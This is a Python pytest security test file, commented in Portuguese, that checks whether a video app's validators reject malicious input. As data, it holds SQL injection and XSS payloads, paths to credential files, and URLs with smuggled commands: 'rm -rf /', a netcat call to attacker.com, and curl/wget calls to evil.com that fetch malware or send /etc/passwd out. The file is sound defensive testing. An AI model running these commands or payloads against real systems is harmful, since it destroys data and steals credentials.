"""Testes de segurança para validação de inputs."""
import pytest
import tempfile
import os
import logging
from pathlib import Path
from unittest.mock import patch, Mock
from io import StringIO

from src.domain.entities.video import Video
from src.domain.validators.video_validators import (
    validate_video_id, 
    validate_video_title,
    validate_video_sources
)
from src.domain.validators.url_validators import (
    validate_url_format,
    validate_youtube_url,
    extract_youtube_video_id
)
from src.domain.exceptions.alfredo_errors import InvalidVideoFormatError
from src.config.alfredo_config import AlfredoConfig


class TestMaliciousInputValidation:
    """Testes de segurança para inputs maliciosos."""
    
    @pytest.mark.security
    def test_sql_injection_attempts_in_video_id(self):
        """Testa proteção contra tentativas de SQL injection em IDs."""
        malicious_ids = [
            "'; DROP TABLE videos; --",
            "1' OR '1'='1",
            "admin'/*",
            "1; DELETE FROM users; --",
            "' UNION SELECT * FROM passwords --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for malicious_id in malicious_ids:
            with pytest.raises(InvalidVideoFormatError) as exc_info:
                validate_video_id(malicious_id)
            
            # Verificar que a mensagem de erro não expõe informações sensíveis
            error_msg = str(exc_info.value).lower()
            assert "sql" not in error_msg
            assert "database" not in error_msg
            assert "table" not in error_msg
    
    @pytest.mark.security
    def test_xss_attempts_in_video_title(self):
        """Testa proteção contra tentativas de XSS em títulos."""
        malicious_titles = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "<svg onload=alert('XSS')>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;"
        ]
        
        for malicious_title in malicious_titles:
            # Títulos maliciosos devem ser aceitos como strings normais
            # mas não devem causar execução de código
            try:
                validate_video_title(malicious_title)
                # Se passou na validação, verificar que não há execução de código
                assert True  # Título foi tratado como string normal
            except InvalidVideoFormatError:
                # Se falhou na validação, deve ser por tamanho ou formato, não por XSS
                pass
    
    @pytest.mark.security
    def test_path_traversal_attempts_in_file_paths(self):
        """Testa proteção contra path traversal em caminhos de arquivo."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../../root/.ssh/id_rsa",
            "..\\..\\..\\..\\boot.ini",
            "/proc/self/environ",
            "file:///etc/passwd",
            "\\\\server\\share\\file.txt"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(InvalidVideoFormatError) as exc_info:
                # Tentar criar vídeo com caminho malicioso
                Video(
                    id="security_test",
                    title="Security Test",
                    duration=120,
                    file_path=malicious_path
                )
            
            # Verificar que erro é sobre arquivo não encontrado, não sobre segurança
            error_msg = str(exc_info.value).lower()
            assert any(word in error_msg for word in ["arquivo", "file", "path", "encontrado"])
    
    @pytest.mark.security
    def test_command_injection_attempts_in_urls(self):
        """Testa proteção contra command injection em URLs."""
        malicious_urls = [
            "https://youtube.com/watch?v=test; rm -rf /",
            "https://youtube.com/watch?v=test && cat /etc/passwd",
            "https://youtube.com/watch?v=test | nc attacker.com 4444",
            "https://youtube.com/watch?v=test; wget http://evil.com/malware.sh",
            "https://youtube.com/watch?v=test`whoami`",
            "https://youtube.com/watch?v=test$(id)",
            "https://youtube.com/watch?v=test;curl evil.com/steal.php?data=$(cat /etc/passwd)"
        ]
        
        for malicious_url in malicious_urls:
            # URLs maliciosas devem falhar na validação de formato
            with pytest.raises(InvalidVideoFormatError):
                validate_url_format(malicious_url)
    
    @pytest.mark.security
    def test_buffer_overflow_attempts(self):
        """Testa proteção contra tentativas de buffer overflow."""
        # Strings extremamente longas
        very_long_id = "A" * 10000
        very_long_title = "B" * 50000
        very_long_url = "https://youtube.com/watch?v=" + "C" * 10000
        
        # ID muito longo deve falhar
        with pytest.raises(InvalidVideoFormatError):
            validate_video_id(very_long_id)
        
        # Título muito longo deve falhar
        with pytest.raises(InvalidVideoFormatError):
            validate_video_title(very_long_title)
        
        # URL muito longa deve falhar
        with pytest.raises(InvalidVideoFormatError):
            validate_url_format(very_long_url)
    
    @pytest.mark.security
    def test_null_byte_injection(self):
        """Testa proteção contra null byte injection."""
        null_byte_inputs = [
            "normal_id\x00malicious_part",
            "title\x00<script>alert('xss')</script>",
            "https://youtube.com/watch?v=test\x00&malicious=true",
            "file.mp4\x00.exe"
        ]
        
        for null_input in null_byte_inputs:
            # Inputs com null bytes devem ser rejeitados ou sanitizados
            if "\x00" in null_input:
                # Verificar que null bytes são tratados adequadamente
                sanitized = null_input.replace("\x00", "")
                assert "\x00" not in sanitized


class TestURLSecurityValidation:
    """Testes de segurança específicos para URLs."""
    
    @pytest.mark.security
    def test_malicious_url_schemes(self):
        """Testa proteção contra esquemas de URL maliciosos."""
        malicious_schemes = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox('XSS')",
            "file:///etc/passwd",
            "ftp://malicious.com/backdoor",
            "ldap://attacker.com/",
            "gopher://evil.com:70/",
            "dict://attacker.com:2628/"
        ]
        
        for malicious_url in malicious_schemes:
            with pytest.raises(InvalidVideoFormatError):
                validate_url_format(malicious_url)
    
    @pytest.mark.security
    def test_url_redirect_attacks(self):
        """Testa proteção contra ataques de redirecionamento de URL."""
        redirect_urls = [
            "https://youtube.com@evil.com/",
            "https://youtube.com.evil.com/",
            "https://youtube.com%2eevil.com/",
            "https://youtube.com%252eevil.com/",
            "https://youtube.com\\@evil.com/",
            "https://youtube.com#@evil.com/"
        ]
        
        for redirect_url in redirect_urls:
            # URLs de redirecionamento devem falhar na validação
            with pytest.raises(InvalidVideoFormatError):
                validate_youtube_url(redirect_url)
    
    @pytest.mark.security
    def test_unicode_normalization_attacks(self):
        """Testa proteção contra ataques de normalização Unicode."""
        unicode_attacks = [
            "https://youtubе.com/watch?v=test",  # Cyrillic 'e'
            "https://youtube.com/watch?v=tеst",   # Cyrillic 'e' in video ID
            "https://youtube.com/watch?v=te\u200Bst",  # Zero-width space
            "https://youtube.com/watch?v=te\uFEFFst",  # Byte order mark
            "https://youtube.com/watch?v=te\u202Est",  # Right-to-left override
        ]
        
        for unicode_url in unicode_attacks:
            # URLs com caracteres Unicode suspeitos devem ser tratadas com cuidado
            try:
                result = validate_youtube_url(unicode_url)
                # Se passou, verificar que foi normalizada adequadamente
                assert result is not None
            except InvalidVideoFormatError:
                # Se falhou, é aceitável para segurança
                pass


class TestFileSystemSecurity:
    """Testes de segurança para operações de sistema de arquivos."""
    
    @pytest.mark.security
    def test_directory_traversal_protection(self):
        """Testa proteção contra directory traversal."""
        with tempfile.TemporaryDirectory() as temp_dir:
            config = AlfredoConfig(base_dir=Path(temp_dir))
            
            # Tentar acessar arquivos fora do diretório base
            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                temp_dir + "/../../../etc/passwd",
                Path(temp_dir).parent.parent / "sensitive_file.txt"
            ]
            
            for malicious_path in malicious_paths:
                # Verificar que paths maliciosos não escapam do diretório base
                try:
                    resolved_path = Path(malicious_path).resolve()
                    base_path = Path(temp_dir).resolve()
                    
                    # Path não deve escapar do diretório base
                    assert not str(resolved_path).startswith(str(base_path.parent.parent))
                except (OSError, ValueError):
                    # Erro ao resolver path é aceitável
                    pass
    
    @pytest.mark.security
    def test_symlink_attack_protection(self):
        """Testa proteção contra ataques de symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Criar arquivo legítimo
            legitimate_file = temp_path / "legitimate.mp4"
            legitimate_file.write_text("legitimate content")
            
            # Tentar criar symlink para arquivo sensível (se suportado pelo OS)
            try:
                sensitive_target = temp_path / "sensitive.txt"
                sensitive_target.write_text("sensitive data")
                
                symlink_path = temp_path / "malicious_symlink.mp4"
                if os.name != 'nt':  # Unix-like systems
                    symlink_path.symlink_to(sensitive_target)
                    
                    # Verificar que symlinks são detectados
                    assert symlink_path.is_symlink()
                    
                    # Sistema deve tratar symlinks com cuidado
                    if symlink_path.exists():
                        # Se symlink é seguido, deve ser controlado
                        content = symlink_path.read_text()
                        assert len(content) > 0
                        
            except (OSError, NotImplementedError):
                # Symlinks podem não ser suportados em todos os sistemas
                pass
    
    @pytest.mark.security
    def test_file_permission_security(self):
        """Testa segurança de permissões de arquivo."""
        with tempfile.TemporaryDirectory() as temp_dir:
            config = AlfredoConfig(base_dir=Path(temp_dir))
            config.create_directory_structure()
            
            # Verificar que diretórios foram criados com permissões adequadas
            for directory in [config.data_dir, config.temp_dir]:
                if directory.exists():
                    # Diretório deve ser acessível pelo usuário atual
                    assert os.access(directory, os.R_OK)
                    assert os.access(directory, os.W_OK)
                    
                    # Em sistemas Unix, verificar permissões mais específicas
                    if os.name != 'nt':
                        stat_info = directory.stat()
                        # Permissões não devem ser muito abertas (não 777)
                        permissions = oct(stat_info.st_mode)[-3:]
                        assert permissions != '777'


class TestLoggingSecurity:
    """Testes de segurança para logging."""
    
    @pytest.mark.security
    def test_sensitive_data_not_logged(self):
        """Testa que dados sensíveis não são logados."""
        # Capturar logs
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger("test_security")
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        
        # Simular operações que poderiam logar dados sensíveis
        sensitive_data = {
            "api_key": "sk-1234567890abcdef",
            "password": "super_secret_password",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
            "credit_card": "4111-1111-1111-1111"
        }
        
        # Logar informações (simulando operação normal)
        logger.info(f"Processing video with config: {{'timeout': 300, 'quality': 'best'}}")
        logger.debug("Video processing completed successfully")
        
        # Verificar que dados sensíveis não aparecem nos logs
        log_content = log_stream.getvalue().lower()
        
        for sensitive_key, sensitive_value in sensitive_data.items():
            assert sensitive_value.lower() not in log_content, \
                f"Sensitive data '{sensitive_key}' found in logs"
        
        # Verificar que palavras-chave sensíveis não aparecem
        sensitive_keywords = ["password", "api_key", "token", "secret", "key"]
        for keyword in sensitive_keywords:
            # Permitir que palavras apareçam em contexto seguro (como nomes de campos)
            # mas não valores reais
            if keyword in log_content:
                # Verificar que não há valores após a palavra-chave
                lines_with_keyword = [line for line in log_content.split('\n') if keyword in line]
                for line in lines_with_keyword:
                    # Linha não deve conter padrões de valores sensíveis
                    assert not any(pattern in line for pattern in [
                        "sk-", "eyj", "bearer", "basic", "4111", "1234"
                    ])
    
    @pytest.mark.security
    def test_log_injection_protection(self):
        """Testa proteção contra log injection."""
        logger = logging.getLogger("test_log_injection")
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        
        # Tentativas de log injection
        malicious_inputs = [
            "normal_input\n[FAKE] CRITICAL: System compromised",
            "user_input\r\n[ERROR] Fake error message",
            "input\x00[ALERT] Null byte injection",
            "test\n\n[ADMIN] Fake admin message"
        ]
        
        for malicious_input in malicious_inputs:
            # Logar input (simulando log de entrada de usuário)
            logger.info(f"Processing input: {repr(malicious_input)}")
        
        log_content = log_stream.getvalue()
        
        # Verificar que caracteres de controle foram escapados
        assert "\n[FAKE]" not in log_content
        assert "\r\n[ERROR]" not in log_content
        assert "\x00[ALERT]" not in log_content
        
        # Verificar que repr() foi usado para escapar caracteres especiais
        assert "\\n" in log_content or "repr(" in log_content.lower()


class TestConfigurationSecurity:
    """Testes de segurança para configurações."""
    
    @pytest.mark.security
    def test_api_key_exposure_protection(self):
        """Testa proteção contra exposição de API keys."""
        with patch.dict(os.environ, {"GROQ_API_KEY": "sk-test-key-12345"}):
            config = AlfredoConfig()
            
            # Verificar que API key não é exposta em representação string
            config_str = str(config)
            assert "sk-test-key-12345" not in config_str
            
            # Verificar que API key não é exposta em repr
            config_repr = repr(config)
            assert "sk-test-key-12345" not in config_repr
            
            # Verificar que API key não é exposta em dict conversion (se existir)
            if hasattr(config, '__dict__'):
                config_dict_str = str(config.__dict__)
                # API key pode estar presente, mas deve estar mascarada ou truncada
                if "groq_api_key" in config_dict_str:
                    # Se presente, deve estar mascarada
                    assert "sk-test-key-12345" not in config_dict_str or \
                           "***" in config_dict_str or \
                           "sk-***" in config_dict_str
    
    @pytest.mark.security
    def test_configuration_validation_security(self):
        """Testa segurança na validação de configurações."""
        # Configurações potencialmente perigosas
        dangerous_configs = {
            "max_video_duration": -1,  # Valor negativo
            "download_timeout": 0,     # Timeout zero
            "max_file_size_mb": 999999,  # Tamanho excessivo
            "max_concurrent_downloads": 1000  # Concorrência excessiva
        }
        
        for config_key, dangerous_value in dangerous_configs.items():
            with pytest.raises(Exception):  # Deve falhar na validação
                AlfredoConfig(**{config_key: dangerous_value})
    
    @pytest.mark.security
    def test_path_injection_in_config(self):
        """Testa proteção contra path injection em configurações."""
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "\\\\network\\share\\malicious"
        ]
        
        for malicious_path in malicious_paths:
            try:
                # Tentar configurar com path malicioso
                config = AlfredoConfig(base_dir=Path(malicious_path))
                
                # Se não falhou, verificar que path foi sanitizado
                resolved_path = config.base_dir.resolve()
                
                # Path não deve apontar para locais sensíveis do sistema
                sensitive_paths = ["/etc", "/root", "C:\\Windows\\System32"]
                for sensitive_path in sensitive_paths:
                    assert not str(resolved_path).startswith(sensitive_path)
                    
            except (ValueError, OSError, PermissionError):
                # Erro é aceitável para paths maliciosos
                pass